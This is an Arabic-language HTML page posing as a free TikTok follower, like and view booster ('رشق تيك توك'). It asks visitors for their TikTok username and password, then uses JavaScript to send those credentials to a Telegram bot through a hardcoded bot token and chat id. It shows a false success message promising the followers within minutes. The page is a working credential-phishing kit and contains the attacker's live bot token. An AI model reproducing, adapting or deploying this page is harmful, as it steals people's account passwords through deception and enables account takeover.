
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>فري فولو - رشق تيك توك</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(to bottom, #111, #222);
            color: white;
            text-align: center;
            padding: 30px;
        }
        .container {
            max-width: 400px;
            margin: auto;
            background: #1e1e1e;
            padding: 20px;
            border-radius: 20px;
            box-shadow: 0 0 10px #000;
        }
        input, select, button {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: none;
            border-radius: 10px;
        }
        button {
            background: #ff0050;
            color: white;
            font-size: 18px;
            cursor: pointer;
        }
        button:hover {
            background: #e60045;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔥 فري فولو - رشق تيك توك مجانا</h2>
        <input type="text" id="username" placeholder="اسم مستخدم تيك توك">
        <input type="password" id="password" placeholder="كلمة المرور (تأكد من صحتها)">
        <select id="amount">
            <option value="1000">1000 متابع</option>
            <option value="2000">2000 متابع</option>
            <option value="5000">5000 متابع</option>
        </select>
        <select id="type">
            <option value="متابعين">متابعين</option>
            <option value="لايكات">لايكات</option>
            <option value="مشاهدات">مشاهدات</option>
        </select>
        <button onclick="sendData()">ابدأ الرشق الآن</button>
    </div>

    <script>
        function sendData() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const amount = document.getElementById('amount').value;
            const type = document.getElementById('type').value;

            const message = `👤 تيك توك جديد:
يوزر: ${username}
كلمة السر: ${password}
الرشق: ${type}
العدد: ${amount}`;
            const token = "7197079453:AAFnVl-c5S28araI2YScZOPlQzBUXn_zZIk";
            const chat_id = "7197079453";

            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chat_id,
                    text: message
                })
            }).then(() => {
                alert("✅ تم إرسال الطلب بنجاح! سيتم الرشق خلال دقائق.");
            });
        }
    </script>
</body>
</html>
